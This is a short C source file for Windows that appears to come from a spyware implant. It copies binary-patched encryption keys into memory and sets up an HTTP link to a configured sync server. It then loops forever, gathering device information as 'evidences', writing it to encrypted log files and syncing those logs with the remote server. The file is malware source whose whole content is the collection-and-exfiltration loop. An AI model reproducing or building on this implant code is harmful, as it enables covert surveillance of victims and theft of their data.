#include <Windows.h>

#include "sync_thread.h"
#include "binpatched_vars.h"
#include "device_agent.h"
#include "log_files.h"
#include "win_http.h"
#include "md5.h"
#include "proto.h"

extern BYTE pServerKey[32];
extern BYTE pConfKey[32];
extern BYTE pSessionKey[20];
extern BYTE pLogKey[32];


VOID SyncThreadFunction()
{
	memcpy(pServerKey, CLIENT_KEY, 32);
	memcpy(pConfKey, ENCRYPTION_KEY_CONF, 32);
	memcpy(pLogKey, ENCRYPTION_KEY, 32);
#ifdef _DEBUG_BINPATCH
	MD5((PBYTE)CLIENT_KEY, 32, (PBYTE)pServerKey);
	MD5((PBYTE)ENCRYPTION_KEY_CONF, 32, (PBYTE)pConfKey);
	MD5((PBYTE)ENCRYPTION_KEY, 32, (PBYTE)pLogKey);
#endif

	InitializeCommunications();
	while(1)
	{
		Sleep(SYNC_INTERVAL);
#ifdef _DEBUG
		OutputDebugString(L"[*] Starting sync...\n");
#endif
		// get evidences
		PWCHAR pBuffer = GetDeviceInfo();
		HANDLE hFile = CreateLogFile(PM_DEVICEINFO, NULL, 0);
		WriteLogFile(hFile, (PBYTE)pBuffer, wcslen(pBuffer) * sizeof(WCHAR));
		free(pBuffer);
		CloseHandle(hFile);

		SyncWithServer();
	}
}


VOID InitializeCommunications()
{
	ULONG pServerPort;
	BYTE pServerIp[32];

	WinHTTPSetup((PBYTE)SYNC_SERVER, pServerIp, sizeof(pServerIp), &pServerPort);
}


